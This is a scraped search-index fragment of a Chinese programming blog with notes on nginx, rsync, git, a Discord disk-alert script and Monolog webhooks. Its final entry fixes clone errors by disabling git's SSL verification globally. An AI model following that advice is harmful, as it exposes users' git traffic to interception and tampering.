","date":"2019-04-05","objectID":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/:8:0","tags":["nginx","apache"],"title":"遇到Content-Length不正確到底發生什麼情況","uri":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/"},{"categories":["寫程式一些事"],"content":"nginx POST 打靜態資源會 405 Nginx 將靜態文件響應 POST 請求，提示 405 錯誤問題 Nginx 的 405 錯誤 絕大多數服務器，都不允許靜態文件響應 POST 請求(GET 請求靜態文件是天經地義的)，否則會返回 HTTP/1.1 405 Method not allowed 錯誤。 然而在前端開發中，前端開發工程師經常模擬後端請求，返回靜態數據來查看頁面效果，怎麼辦？ ","date":"2019-04-05","objectID":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/:9:0","tags":["nginx","apache"],"title":"遇到Content-Length不正確到底發生什麼情況","uri":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/"},{"categories":["寫程式一些事"],"content":"其他小記 curl 預設是 Content-Type: application/x-www-form-urlencoded ，假如要傳 raw data 要改成 Content-Type: text/plain curl’s –data will by default send Content-Type: application/x-www-form-urlencoded in the request header. However, when using Postman’s raw body mode, Postman sends Content-Type: text/plain in the request header. So to achieve the same thing as Postman, specify -H “Content-Type: text/plain” for curl: 重啟 docker nginx Docker: Reload Nginx Inside Container - ShellHacks docker container exec \u003ccontainer\u003e nginx -t docker container exec \u003ccontainer\u003e nginx -s reload Keep-Alive 为 close 也無法改變 nginx 的 content-length 問題 keepalive_timeout 0; ，就可以關掉 Full request/response body logging in nginx 沒有測試，好像要裝 lua-nginx-module Full request/response body logging in nginx ","date":"2019-04-05","objectID":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/:10:0","tags":["nginx","apache"],"title":"遇到Content-Length不正確到底發生什麼情況","uri":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/"},{"categories":["寫程式一些事"],"content":"感想與結論 沒事還是請傳好正確 content-length:0 原本想讓 server 變成 http1.0 但好像怎麼用都失敗 對方說沒辦法改的話 最終大絕可能使用apache+php_mod不過最糟的情形還是會被 WAF 阻擋 這幾天總覺得浪費很多時間找這玩意 明明是對方的鍋，還是要想辦法解決 但是真的不希望遇到第二次 冏 2020-05-27 用了这么久HTTP, 你是否了解Content-Length? | Fundebug博客 - 一行代码搞定BUG监控 - 网站错误监控|JS错误监控|资源加载错误|网络请求错误|小程序错误监控|Java异常监控|监控报警|Source Map|用户行为|可视化重现 這篇有簡單明確講到我這篇重點 其他參考來源: Http Header 入門 | CCNP 筆記本 HTTP Request/Response 駭客跟我們想的不一樣 – 軟體品管的專業思維 security apache 與 php 關閉版本顯示 | SSORC.tw 資訊手札: Apache Http Header web-server | 平凡備忘錄 HTTP 協議頭部與 Keep-Alive 模式詳解 - BYVoid nginx 优化的一些建议 - 吕滔博客 客户端 POST 错误，服务端应该回 200 还是 400？ - 知乎 Http 協議中關於 Content-Length 的解讀 - 簡書 Docker: Reload Nginx Inside Container - ShellHacks Nginx 设置 Keep-Alive 为 close - meteoric_cry - 博客园 Nginx 將靜態文件響應 POST 請求，提示 405 錯誤問題 Nginx 将静态文件响应 POST 请求，提示 405 错误问题 - 千思网 Full request/response body logging in nginx Nginx 安装 lua-nginx-module 模块 - 拼搏的小船长 - CSDN 博客 未連線: 潛在的安全性問題 Web Application Firewall 的偵測原理 – 軟體品管的專業思維 nginx 的 chunked_transfer_encoding 没有生效 - 开源中国 5 Open Source Web Application Firewall for Better Security 不只是資安: [工具介紹] Apache 模組 mod_security - 以阻擋造訪路徑攻擊為例 Nginx 之 fastcgi_param 参数详见 - 简书 使用 curl 指令測試 REST 服務 linux - How to post raw body data with curl? - Stack Overflow Where is php-fpm log file? Or how to activate it? Does PHP7 log errors? · Issue #48 · rlerdorf/php7dev Nginx 啟用 PHP-FPM 服務狀態監控網頁教學 - G. T. Wang Where is the default zsh history file? - Stack Overflow ","date":"2019-04-05","objectID":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/:11:0","tags":["nginx","apache"],"title":"遇到Content-Length不正確到底發生什麼情況","uri":"/blog/posts/%E9%81%87%E5%88%B0Content-Length%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%88%B0%E5%BA%95%E7%99%BC%E7%94%9F%E4%BB%80%E9%BA%BC%E6%83%85%E6%B3%81/"},{"categories":["JavaScript"],"content":"最近 JS 有一個 bug 發現 bug 是在 switch 我是字串跟數字去做比對 就發現 js 不會批對到我想要的(跑去 default:去) 趕快來筆記!! switch (\"1\") { case 1: console.log(\"1\"); break; case \"1\": console.log(\"2\"); break; } Ans: 2 \u003c?php switch('1'){ case 1: echo '1'; break; case '1': echo '2'; break; } Ans: 1 Google 找了一下 JS 的 switch Description Section A switch statement first evaluates its expression. It then looks for the first case clause whose expression evaluates to the same value as the result of the input expression (using the strict comparison, ===) and transfers control to that clause, executing the associated statements. (If multiple cases match the provided value, the first case that matches is selected, even if the cases are not equal to each other.) 裡面有提到他是用 switch 試用三個等於=== PHP 是用兩個等於，可以看官網文件PHP: switch - Manual ","date":"2019-03-26","objectID":"/blog/posts/js-php%E7%9A%84switch%E5%B7%AE%E7%95%B0/:0:0","tags":["js","php","switch"],"title":"js,php的switch差異","uri":"/blog/posts/js-php%E7%9A%84switch%E5%B7%AE%E7%95%B0/"},{"categories":["Linux"],"content":"最近想同步檔案道別台機器 想比較 scp,rsync,winscp 有什麼同步的方法 比較一下差異 ","date":"2019-03-23","objectID":"/blog/posts/scp-rsync-winscp%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98%E5%92%8C%E5%90%8C%E9%83%A8%E5%82%99%E4%BB%BD%E6%96%B9%E6%B3%95/:0:0","tags":["scp","rsync","winscp"],"title":"scp,rsync,winscp使用小記和同部備份方法","uri":"/blog/posts/scp-rsync-winscp%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98%E5%92%8C%E5%90%8C%E9%83%A8%E5%82%99%E4%BB%BD%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"scp 之前有寫過這篇scp 跟 sftp 是不一樣的東西 | 程式狂想筆記 所以這個沒有辦法跟 rysnc 一樣判斷同步 但有加密功能 使用也很簡單，不需要先 ssh 別台主機 直接 command 使用scp xxx@ooo:xxx fff@bbb:xxx 不過路徑可能要清楚是哪邊 複製資料夾除了用*方式 但用星號無法多層 要使用-r Recursively copy entire directories scp -r user@your.server.example.com:/path/to/foo /home/user/Desktop/ shell - How to copy a folder from remote to local using scp? - Stack Overflow ","date":"2019-03-23","objectID":"/blog/posts/scp-rsync-winscp%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98%E5%92%8C%E5%90%8C%E9%83%A8%E5%82%99%E4%BB%BD%E6%96%B9%E6%B3%95/:1:0","tags":["scp","rsync","winscp"],"title":"scp,rsync,winscp使用小記和同部備份方法","uri":"/blog/posts/scp-rsync-winscp%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98%E5%92%8C%E5%90%8C%E9%83%A8%E5%82%99%E4%BB%BD%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"rsync 跟 scp 差別預設沒有加密，但還是有辦法做加密。 剛看了一下別的文章 2004 年後預設說有做 ssh 加密 難怪我有看到有些說預設有 ssh 加密，有些沒有… 可參考Rsync -e option to ssh - Unix \u0026 Linux Stack Exchange Assuming you’re not needing to consider the rsync protocol itself, this depends on the compilation options used for your version of rsync. It used to be the case that rsync used the rsh protocol by default (unless the build-time default had been changed), but the build-time default changed to ssh in 2004. If you’re in doubt, start the rsync process transferring a relatively large file (or collection of files), and in another terminal run ps -ef | grep [r]sync. This will show you whether or not you’re using ssh for a transport. Here’s an example from one of my servers, which clearly shows the ssh transport: root 28057 27173 1 09:48 pts/4 00:00:00 rsync -avHP --dry-run /home roaima@otherserver: root 28058 28057 0 09:48 pts/4 00:00:00 ssh -l roaima otherserver rsync --server -vnlHogDtpre.iLsfx --partial . . Finally, be aware that the compilation default can be overridden with the RSYNC_RSH environment variable. (See the man page for further details.) 有時間在驗證上面到底有沒有加密 他有很多參數 目前我常用是用-av，不過是先前前輩給我用的設定 我還沒搞清楚 -a, --archive 歸檔模式，表示以遞歸方式傳輸文件，並保持所有文件屬性，等於-rlptgoD -v, --verbose 詳細模式輸出 --delete 刪除那些目標目錄中有而源目錄中沒有的多餘文件。這個是 rsync 做增量方式的全備份的最佳選擇方案！！！！！！ 簡單說加入`--delete`就是本基做刪除動作，但是遠端就會**做刪除** 反之，沒家的話就不會。 詳細記紹可以看 SCP 和 Rsync 遠程拷貝的幾個技巧 - 散盡浮華 - 博客園 備份圖 SSH,SCP,rsync,sftp - 简书 備份圖 不過 window 就算有裝 git bash，但預設沒有 rsync 可以用 所以我才會找找有沒有類似在 window winscp 做同步更新方法 當然我也有找到 window 能用 rsync Chocolatey Gallery | cwRsync (Free Edition) 5.5.0.20190204 Sync-Rsync - Visual Studio Marketplace 2020-04-23 rsync –av /etc server1:/tmp # 複製目錄和目錄下文件 rsync –av /etc/ server1:/tmp # 只複製目錄下文件 rsync -avh myfile.gz /home/pi/tmp/ # 複製檔案到資料夾 rsync -avzh pi@192.168.1.12:/mypath/myfile.gz /mybackup/ rsync -avzh --bwlimit=100K pi@192.168.1.12:/mypath/myfile.gz /mybackup/ # --bwlimit 限制頻寬 -n 模擬複製過程 -v 顯示詳細過程 -r 遞歸複製目錄樹 -p 保留權限 -t 保留時間戳 -g 保留組信息 -o 保留所有者信息 -l 將軟鏈接文件本身進行複製（默認） -L 將軟鏈接文件指向的文件複製 -a 存檔，相當於–rlptgoD，但不保留ACL（-A）和SELinux屬性（-X） –delete 如果沒有來源檔案只有新增、沒有減少的話，它就跟一般的複製 -h：將數字以比較容易閱讀的格式輸出。 ","date":"2019-03-23","objectID":"/blog/posts/scp-rsync-winscp%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98%E5%92%8C%E5%90%8C%E9%83%A8%E5%82%99%E4%BB%BD%E6%96%B9%E6%B3%95/:2:0","tags":["scp","rsync","winscp"],"title":"scp,rsync,winscp使用小記和同部備份方法","uri":"/blog/posts/scp-rsync-winscp%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98%E5%92%8C%E5%90%8C%E9%83%A8%E5%82%99%E4%BB%BD%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"WinSCP 內建也有做同步功能 Scripting and Task Automation :: WinSCP Synchronize Dialog :: WinSCP 其他參考來源: SCP 和 Rsync 远程拷贝的几个技巧 - 散尽浮华 - 博客园 使用 WinSCP 进行简单代码文件同步 - leestar54 - 博客园 Synchronize Dialog :: WinSCP Scripting and Task Automation :: WinSCP 厭世人生的 MIS 記事本: rsync 參數 用法 SSH,SCP,rsync,sftp - 简书 backup - Do you need -e ssh for rsync? - Server Fault 詳全文_資料備份同步工具簡介— rsync rsync 備份 | Tsung’s Blog Rsync 備份本地及遠端目錄 How to Remove User and Hostname in Terminal Prompt - Make Tech Easier date: 2019-03-31 最近在 window 使用 rsync 結果發現他還是全部檔案會傳上去 Google 一下，發現要加--modify-window=1才能解決全部上傳問題我自己電腦測試失敗… 但發現可能是我在 linux 做chmod o+rx -R .關係，因為剛開始複製是750 晚點看看--chmod=755能否解決? 但原始資料來源，做 rsync 好像正常… 有看到用--size-only但這也不是最好的同步方式 難免改檔案大小都一樣 –checksum 和–ignore-times 选项之间的 Rsync 差异 - 代码日志 将使用 rsync 增量的文件备份到 NTFS 分区 Backup files incremental with rsync to a NTFS-Partition-rootopen.com Linux 命令：Rsync 常见问题之 Debug | Jason’s Blog 如何在 FAT 文件系统中使用 rsync？ | webmotociclismo.com 一千萬個為什麽 | 僅在從 ext4 同步到 NTFS 時顯示已更改的文件 chmod rsync - Google 搜尋 就是愛點鬧: Windows 下好用的檔案同步工具 [【 Linux 】檔案同步工具 rsync 指令 - 亞索數位筆記](https://blog.aiso.idv.tw/ 介绍 rsync 同步工具配置与使用，linuxlinux, linuxwindows(cwRsync) - lsbwahaha - BlogJava rsync 使用简介 | 喵 ♂ 呜 的博客 rsync：–size-only 和–ignore-times 之间的区别 | landcareweb.com rsync：–size-only 和–ignore-times 之间的差异 - 代码日志 –checksum 和–ignore-times 选项之间的 Rsync 差异 - 代码日志 「」checksum 和」ignore-times 選項之間的 Rsync 差異 –checksum 和–ignore-times 选项之间的 Rsync 差异 - 代码日志 目前我有一隻 window-\u003elinux rsync -vr --progress --chmod=755 ./local_path/ user@ip:/path 參考來源： 将使用 rsync 增量的文件备份到 NTFS 分区 Backup files incremental with rsync to a NTFS-Partition-rootopen.com Linux 命令：Rsync 常见问题之 Debug | Jason’s Blog 如何在 FAT 文件系统中使用 rsync？ | webmotociclismo.com ","date":"2019-03-23","objectID":"/blog/posts/scp-rsync-winscp%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98%E5%92%8C%E5%90%8C%E9%83%A8%E5%82%99%E4%BB%BD%E6%96%B9%E6%B3%95/:3:0","tags":["scp","rsync","winscp"],"title":"scp,rsync,winscp使用小記和同部備份方法","uri":"/blog/posts/scp-rsync-winscp%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98%E5%92%8C%E5%90%8C%E9%83%A8%E5%82%99%E4%BB%BD%E6%96%B9%E6%B3%95/"},{"categories":["vscode"],"content":"最近很常開專案開啟額外不同的檔案 有時候找檔案時候就會跳出來 所以今天有去搜尋要怎麼清掉 如下 喝喝，就是這麼簡單 簡單都怕忘掉 ","date":"2019-03-23","objectID":"/blog/posts/%E6%B8%85%E9%99%A4vscode%E4%B8%80%E5%80%8B%E6%AA%94%E4%B8%8D%E5%90%8C%E5%B0%88%E6%A1%88%E9%96%8B%E5%95%9F%E8%A8%98%E9%8C%84/:0:0","tags":["vscode"],"title":"清除vscode一個檔不同專案開啟記錄","uri":"/blog/posts/%E6%B8%85%E9%99%A4vscode%E4%B8%80%E5%80%8B%E6%AA%94%E4%B8%8D%E5%90%8C%E5%B0%88%E6%A1%88%E9%96%8B%E5%95%9F%E8%A8%98%E9%8C%84/"},{"categories":["Linux"],"content":"最近研究出來 discord webhook 想說讓我的動物機玩玩 但是動物機只有裝 python 也沒看到 monolog for discord 不想自幹因為我不熟 python 原本想說使用看看 nodejs 不過想說用原生 shell 看看 不用安裝環境 隨便 google 爬了一個範例Shell script to watch the disk space - nixCraft 因為有語系關係，所以有調整程式碼 踩雷注意!!! xxx(string): not found shell =前後盡量不要有空白 #!/bin/sh df -H | grep -vE '^Filesystem|tmpfs|cdrom|udev|已用' | awk '{ print $5 \" \" $1 }' | while read output; do echo $output usep=$(echo $output | awk '{ print $1}' | cut -d'%' -f1 ) partition=$(echo $output | awk '{ print $2 }' ) if [ $usep -ge 80 ]; then msg=\"注意快超出硬碟空間\\\\\\\"$partition\\\\\\\" ($usep%) on $(hostname) as on $(date)\" url='https://discordapp.com/api/webhooks/*' curl -H \"Content-Type: application/json\" \\ -X POST \\ -d \"{\\\"username\\\": \\\"system\\\", \\\"content\\\": \\\"${msg}\\\"}\" $url fi done 剩下就是設定一下排程 0 18 * * * sh /root/notify/disk.sh \u003e /dev/null 2\u003e\u00261 任務完成!! 備注: Discord Webhook 可以參考這篇下面使用 monolog 和 slack 做 webhook 小記 | 程式狂想筆記 記得上面 code 要把網址換掉 ","date":"2019-03-21","objectID":"/blog/posts/%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8shell%E5%81%9A%E5%80%8B%E7%A1%AC%E7%A2%9F%E7%A9%BA%E9%96%93%E8%AD%A6%E5%91%8Adiscord%E9%80%9A%E7%9F%A5/:0:0","tags":["linux"],"title":"簡單使用shell做個硬碟空間警告discord通知","uri":"/blog/posts/%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8shell%E5%81%9A%E5%80%8B%E7%A1%AC%E7%A2%9F%E7%A9%BA%E9%96%93%E8%AD%A6%E5%91%8Adiscord%E9%80%9A%E7%9F%A5/"},{"categories":["Git"],"content":"最近修改程式，想還原之前某一隻檔案的時候 下意識想做git reset 但是突然想到我只想還原一個檔案 雖然我有 vscode 可以用 gitlens 去看之前檔案全選出來 但還是覺得看看有沒有找檔案的方式 ","date":"2019-03-21","objectID":"/blog/posts/git%E5%BE%9E%E6%9F%90%E4%B8%80%E5%80%8Bcommit%E9%82%84%E5%8E%9F%E6%9F%90%E4%B8%80%E5%80%8B%E6%AA%94%E6%A1%88%E5%92%8Cgit-log%E6%90%9C%E5%B0%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/:0:0","tags":["git"],"title":"git從某一個commit還原某一個檔案和git log搜尋檔案方法","uri":"/blog/posts/git%E5%BE%9E%E6%9F%90%E4%B8%80%E5%80%8Bcommit%E9%82%84%E5%8E%9F%E6%9F%90%E4%B8%80%E5%80%8B%E6%AA%94%E6%A1%88%E5%92%8Cgit-log%E6%90%9C%E5%B0%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"git 從某一個 commit 還原某一個檔案 最後找到用git checkout方式還原 等等，我記得之前運用都是當下 commit 還原一個檔案 沒想到她竟然還有指定 commit 功能?!! 這邊可能很多人會忘記git checkout跟git reset還原差異 可以看裡面的圖，幫助回憶git reset 和 git reflog 小記 | 程式狂想筆記 ","date":"2019-03-21","objectID":"/blog/posts/git%E5%BE%9E%E6%9F%90%E4%B8%80%E5%80%8Bcommit%E9%82%84%E5%8E%9F%E6%9F%90%E4%B8%80%E5%80%8B%E6%AA%94%E6%A1%88%E5%92%8Cgit-log%E6%90%9C%E5%B0%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/:1:0","tags":["git"],"title":"git從某一個commit還原某一個檔案和git log搜尋檔案方法","uri":"/blog/posts/git%E5%BE%9E%E6%9F%90%E4%B8%80%E5%80%8Bcommit%E9%82%84%E5%8E%9F%E6%9F%90%E4%B8%80%E5%80%8B%E6%AA%94%E6%A1%88%E5%92%8Cgit-log%E6%90%9C%E5%B0%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"one file recover ## 還原指定一隻檔案 ## head -- 可以省略(前提不要跟自己的branch撞到名子就好，通常撞到機率低) git checkout head -- application/controllers/xxxx/xxxx.php git checkout b01* -- application/controllers/line/LibraryPlaylist.php git checkout head -- application/controllers/line/LibraryPlaylist.php ","date":"2019-03-21","objectID":"/blog/posts/git%E5%BE%9E%E6%9F%90%E4%B8%80%E5%80%8Bcommit%E9%82%84%E5%8E%9F%E6%9F%90%E4%B8%80%E5%80%8B%E6%AA%94%E6%A1%88%E5%92%8Cgit-log%E6%90%9C%E5%B0%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/:1:1","tags":["git"],"title":"git從某一個commit還原某一個檔案和git log搜尋檔案方法","uri":"/blog/posts/git%E5%BE%9E%E6%9F%90%E4%B8%80%E5%80%8Bcommit%E9%82%84%E5%8E%9F%E6%9F%90%E4%B8%80%E5%80%8B%E6%AA%94%E6%A1%88%E5%92%8Cgit-log%E6%90%9C%E5%B0%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"all file recover git reset HEAD ","date":"2019-03-21","objectID":"/blog/posts/git%E5%BE%9E%E6%9F%90%E4%B8%80%E5%80%8Bcommit%E9%82%84%E5%8E%9F%E6%9F%90%E4%B8%80%E5%80%8B%E6%AA%94%E6%A1%88%E5%92%8Cgit-log%E6%90%9C%E5%B0%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/:1:2","tags":["git"],"title":"git從某一個commit還原某一個檔案和git log搜尋檔案方法","uri":"/blog/posts/git%E5%BE%9E%E6%9F%90%E4%B8%80%E5%80%8Bcommit%E9%82%84%E5%8E%9F%E6%9F%90%E4%B8%80%E5%80%8B%E6%AA%94%E6%A1%88%E5%92%8Cgit-log%E6%90%9C%E5%B0%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":" Git 還原單一檔案 | 愛吃東西的 RD ","date":"2019-03-21","objectID":"/blog/posts/git%E5%BE%9E%E6%9F%90%E4%B8%80%E5%80%8Bcommit%E9%82%84%E5%8E%9F%E6%9F%90%E4%B8%80%E5%80%8B%E6%AA%94%E6%A1%88%E5%92%8Cgit-log%E6%90%9C%E5%B0%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/:2:0","tags":["git"],"title":"git從某一個commit還原某一個檔案和git log搜尋檔案方法","uri":"/blog/posts/git%E5%BE%9E%E6%9F%90%E4%B8%80%E5%80%8Bcommit%E9%82%84%E5%8E%9F%E6%9F%90%E4%B8%80%E5%80%8B%E6%AA%94%E6%A1%88%E5%92%8Cgit-log%E6%90%9C%E5%B0%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"git log 搜尋檔案方法 常常使用 gitlens 功能 他有一個很神奇功能 可以看當下檔案存在那些 commit 看當下行數有存在那些 commit 今天好奇查了一下指令要怎麼下 ","date":"2019-03-21","objectID":"/blog/posts/git%E5%BE%9E%E6%9F%90%E4%B8%80%E5%80%8Bcommit%E9%82%84%E5%8E%9F%E6%9F%90%E4%B8%80%E5%80%8B%E6%AA%94%E6%A1%88%E5%92%8Cgit-log%E6%90%9C%E5%B0%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/:3:0","tags":["git"],"title":"git從某一個commit還原某一個檔案和git log搜尋檔案方法","uri":"/blog/posts/git%E5%BE%9E%E6%9F%90%E4%B8%80%E5%80%8Bcommit%E9%82%84%E5%8E%9F%E6%9F%90%E4%B8%80%E5%80%8B%E6%AA%94%E6%A1%88%E5%92%8Cgit-log%E6%90%9C%E5%B0%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"file history git log '*/xxxx.php' ","date":"2019-03-21","objectID":"/blog/posts/git%E5%BE%9E%E6%9F%90%E4%B8%80%E5%80%8Bcommit%E9%82%84%E5%8E%9F%E6%9F%90%E4%B8%80%E5%80%8B%E6%AA%94%E6%A1%88%E5%92%8Cgit-log%E6%90%9C%E5%B0%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/:3:1","tags":["git"],"title":"git從某一個commit還原某一個檔案和git log搜尋檔案方法","uri":"/blog/posts/git%E5%BE%9E%E6%9F%90%E4%B8%80%E5%80%8Bcommit%E9%82%84%E5%8E%9F%E6%9F%90%E4%B8%80%E5%80%8B%E6%AA%94%E6%A1%88%E5%92%8Cgit-log%E6%90%9C%E5%B0%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"line history git log -L 103,103:application/xxxx/xxxx.php ","date":"2019-03-21","objectID":"/blog/posts/git%E5%BE%9E%E6%9F%90%E4%B8%80%E5%80%8Bcommit%E9%82%84%E5%8E%9F%E6%9F%90%E4%B8%80%E5%80%8B%E6%AA%94%E6%A1%88%E5%92%8Cgit-log%E6%90%9C%E5%B0%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/:3:2","tags":["git"],"title":"git從某一個commit還原某一個檔案和git log搜尋檔案方法","uri":"/blog/posts/git%E5%BE%9E%E6%9F%90%E4%B8%80%E5%80%8Bcommit%E9%82%84%E5%8E%9F%E6%9F%90%E4%B8%80%E5%80%8B%E6%AA%94%E6%A1%88%E5%92%8Cgit-log%E6%90%9C%E5%B0%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"gitk log gitk '*/Trackinfo.php' #這邊L後面數字要連在一起 gitk -L103,103:application/models/line/api/Mod_libraryPlaylist.php ","date":"2019-03-21","objectID":"/blog/posts/git%E5%BE%9E%E6%9F%90%E4%B8%80%E5%80%8Bcommit%E9%82%84%E5%8E%9F%E6%9F%90%E4%B8%80%E5%80%8B%E6%AA%94%E6%A1%88%E5%92%8Cgit-log%E6%90%9C%E5%B0%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/:3:3","tags":["git"],"title":"git從某一個commit還原某一個檔案和git log搜尋檔案方法","uri":"/blog/posts/git%E5%BE%9E%E6%9F%90%E4%B8%80%E5%80%8Bcommit%E9%82%84%E5%8E%9F%E6%9F%90%E4%B8%80%E5%80%8B%E6%AA%94%E6%A1%88%E5%92%8Cgit-log%E6%90%9C%E5%B0%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95/"},{"categories":["PHP"],"content":"最近在看 monolog 程式如何使用 不過這篇不會詳細記錄 monolog 這篇主要是記錄 slack webhook 怕之後會忘記要怎麼串接 webhook 雖然我平常沒有什麼在玩 slack 同事有開一個 slack，但沒有什麼人再用 monolog 內建有 slack slack 我有 google 到一篇說可以用三種方式連線 嘗試利用 slack api 發送訊息到 teams 內 – taihua – Medium 今天簡單使用 webhook 方式連 首先，從這邊登入Slack API: Applications | Slack 可以create app ![app\"](./1.png “create) ![webhook”](./2.png “add) 點選 on，下面add webhook ...按鈕點下去 會跳出授權頁面，這時候你只要選擇頻道或使用者 會得到一串網址 接下來 monolog 使用 slack webhook 簡單使用如下 就只要把 webhook 網址帶進去就可以用了(太簡單了) \u003c?php require_once './vendor/autoload.php'; use Monolog\\Logger; use Monolog\\Handler\\StreamHandler; use Monolog\\Handler\\SlackWebhookHandler; // create a log channel $log = new Logger('name'); $log-\u003epushHandler(new StreamHandler('path/to/your.log', Logger::WARNING)); $log-\u003epushHandler(new SlackWebhookHandler('https://hooks.slack.com/services/xxxxx')); // add records to the log $log-\u003ewarning('Foo'); $log-\u003ecrit('中文測試'); 這邊還需要注意一件事情 $log-\u003epushHandler(new SlackWebhookHandler('https://hooks.slack.com/services/xxxxx')); 這邊沒有指定 level 等級 我發現 monolog 原生物件 hanlder 每一個預設 level 都不太一樣 以這邊 slack 為例，他預設是$level = Logger::CRITICAL PS 所以上方的 warning 程式不會在 slack 出現 不知道的話可以直接看原始碼比較快 The PHP Package 之 monolog 不完全但够用指南 - 后端 - 掘金 错误与日志 | 《Laravel 5.4 中文文档》 | Laravel China 社区 - 高品质的 Laravel 开发者社区 一旦配置了此选项，Laravel 将记录大于或等于指定日志等级的所有级别。例如，默认将 log_level 设置为 error 那么将会记录 error , critical , alert 和 emergency 日志信息。 Monolog 识别以下日志等级 - 从低到高为: debug , info , notice , warning , error , critical , alert , emergency。 這邊先小記，哈哈，不知道之後有沒有有空再寫一篇 話說 flexget 好像也能做 slack,discord 剛好最近有用 discord 有空研究看看 2019-03-20 今天剛好看到 github 有 discord 的 webhook 現成工具 lefuturiste/monolog-discord-handler: A simple discord handler for support Discord webhooks 原本要找 webhook 進去 discord 開發者頁面找不到 webhook 後來 google 一下 原來可以到頻道設定裡面有 webhook 輕鬆就能新增 webhook 程式碼 \u003c?php require_once './vendor/autoload.php'; use Monolog\\Logger; $log = new Monolog\\Logger('your name'); $log-\u003epushHandler(new DiscordHandler\\DiscordHandler([ 'https://discordapp.com/api/webhooks/xxxxxxxxx/ooooooooooooooooooooooooooooooooooooooooo' ], 'name', 'subname', 'DEBUG')); // add records to the log $log-\u003ewarning('Foo'); $log-\u003ecrit('中文測試'); ","date":"2019-03-19","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8monolog%E5%92%8Cslack-%E5%81%9Awebhook%E5%B0%8F%E8%A8%98/:0:0","tags":["monolog","php","slack"],"title":"使用monolog和slack 做webhook小記","uri":"/blog/posts/%E4%BD%BF%E7%94%A8monolog%E5%92%8Cslack-%E5%81%9Awebhook%E5%B0%8F%E8%A8%98/"},{"categories":["Git"],"content":"網路找到很多這個解法 ","date":"2019-03-16","objectID":"/blog/posts/git%E4%B8%8D%E8%83%BDclone%E4%B8%8B%E4%BE%86%E7%9A%84%E5%95%8F%E9%A1%8C/:0:0","tags":["git"],"title":"git不能clone下來的問題","uri":"/blog/posts/git%E4%B8%8D%E8%83%BDclone%E4%B8%8B%E4%BE%86%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["Git"],"content":"HTTPS 解除 SSL 憑證檢查 ","date":"2019-03-16","objectID":"/blog/posts/git%E4%B8%8D%E8%83%BDclone%E4%B8%8B%E4%BE%86%E7%9A%84%E5%95%8F%E9%A1%8C/:1:0","tags":["git"],"title":"git不能clone下來的問題","uri":"/blog/posts/git%E4%B8%8D%E8%83%BDclone%E4%B8%8B%E4%BE%86%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["Git"],"content":"設定全域不檢查方法 git config --global http.sslVerify false 